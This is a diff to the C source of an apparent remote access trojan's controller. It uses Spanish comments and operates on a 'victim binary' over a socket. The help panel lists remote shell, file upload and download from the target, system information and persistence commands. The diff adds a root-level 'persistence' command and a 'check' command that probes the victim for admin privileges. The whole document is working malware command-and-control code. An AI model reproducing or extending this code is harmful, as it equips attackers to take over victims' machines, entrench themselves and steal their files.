@@ -15,7 +15,7 @@
 #include <locale.h>
 #include "../src/base64.c"
 
-// Upload / Download Fully functional
+// Crear check para mirar permisos de admin
 
 // Definiciones
 #define SOCKBUFFER 2048
@@ -38,6 +38,7 @@ int ReadAndSendFile(SOCKET targetConn, char *file, char *instruct);
 int sndAndExecCmd(SOCKET targetConn, char *command, char *resp);
 int downloadFunc(char *command, SOCKET targetConn, char *ip); 
 int setLowPersistence(SOCKET targetConn, char *command);
+int checkPermissons(SOCKET targetConn, char *command);
 int startServer();
 void helpPannel();
 void ctrlCHandler(int sig);
@@ -110,15 +111,17 @@ void helpPannel(){
     printf("\n\tAvailable Commands:\n\n");
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] shell                 -> Enter Shell Mode \n");
-    printf("\t\t---------------------------------------------------------\n");  
+    printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] download <file>       -> Download from target \n");
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] upload <file>         -> Upload local file to target\n");
-    printf("\t\t---------------------------------------------------------\n");  
+    printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] sysinfo               -> Show info from system target\n");
-    printf("\t\t---------------------------------------------------------\n");  
-    printf("\t\t| [!>] lowpersistence        -> Apply no root needed persistence\n");
-    printf("\t\t---------------------------------------------------------\n");  
+    printf("\t\t---------------------------------------------------------\n");
+    printf("\t\t| [!>] lowpersistence        -> Set a low mode of persistence (no root)\n");
+    printf("\t\t---------------------------------------------------------\n");
+    printf("\t\t| [!>] persistence           -> Set a high mode of persistence (root)\n");
+    printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] q / exit              -> Exit the conection\n");
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] q -y / exit -y        -> Terminate the conection (close victim binary)\n");
@@ -297,18 +300,52 @@ int downloadFunc(char *command, SOCKET targetConn, char *ip) {
     return 0;
 }
 
-int setLowPersistence(SOCKET targetConn, char *command){
+int setPersistence(SOCKET targetConn, char *command, char *method){
     send(targetConn, command, strlen(command), 0);
-    char* recvData = malloc(SOCKBUFFER);    
+    char* recvData = malloc(SOCKBUFFER);  
 
     recv(targetConn, recvData, SOCKBUFFER, 0);
-    if (strcmp("error", recvData) == 0){
-        printColor("\n\n\t[!>] ", RED); printColor("Error gettin low persistence...", YELLOW);
+
+    if (strcmp(method, "low") == 0){
+        if (strcmp("error", recvData) == 0){
+            printColor("\n\n\t[!>] ", RED); printColor("Error geting low persistence...", YELLOW);
+        }
+        else if (strcmp("exito", recvData) == 0){
+            printColor("\n\t[*>] ", YELLOW); printColor("Low persistence setted succsessfully...\n", BLUE);    
+        }
     }
 
-    else if (strcmp("exito", recvData) == 0){
-        printColor("\n\t[!>] ", YELLOW); printColor("Low persistence setted succsessfully...\n", BLUE);
+    if (strcmp(method, "high") == 0){
+        if (strcmp("error", recvData) == 0){
+            printColor("\n\n\t[!>] ", RED); printColor("Error high persistence...", YELLOW);    
+        
+        } else if (strcmp("exito", recvData) == 0){
+            printColor("\n\t[*>] ", YELLOW); printColor("High persistence setted succsessfully...\n", BLUE);
+
+        } else if (strcmp("permissonError", recvData) == 0){
+            printColor("\n\t[!>] ", YELLOW); printColor("Error setting persistence, PermissonError...\n", BLUE);
+        
+        }
     }
+
+    free(recvData);
+    return 0;
+}
+
+int checkPermissons(SOCKET targetConn, char *command){
+    send(targetConn, command,  strlen(command), 0);
+    char* recvData = malloc(SOCKBUFFER);  
+
+    recv(targetConn, recvData, SOCKBUFFER, 0);
+    if (strstr(recvData, "yes") != NULL){
+        printColor("\n\t[*>] ", YELLOW); printColor("Admin Privileges...\n", BLUE);
+    
+    } else if (strstr(recvData, "no") != NULL){
+        printColor("\n\t[*>] ", YELLOW); printColor("User Privileges...\n", BLUE);
+    } 
+
+    free(recvData);
+    return 0;
 }
 
 int mainFunction(int targetConn, char *clientIP, unsigned short clientPort){
@@ -365,7 +402,13 @@ int mainFunction(int targetConn, char *clientIP, unsigned short clientPort){
                 StartGetSysInfo(targetConn, command);
                 
             } else if (strcmp(command, "lowpersistence") == 0){
-                setLowPersistence(targetConn, command);
+                setPersistence(targetConn, command, "low");
+        
+            } else if (strcmp(command, "persistence") == 0){
+                setPersistence(targetConn, command, "high");
+        
+            } else if (strcmp(command, "check") == 0){
+                checkPermissons(targetConn, command);
         
             } else {
                 printColor("\n\t[!>] ", RED); printColor("Instruct Not Known...\n", YELLOW);
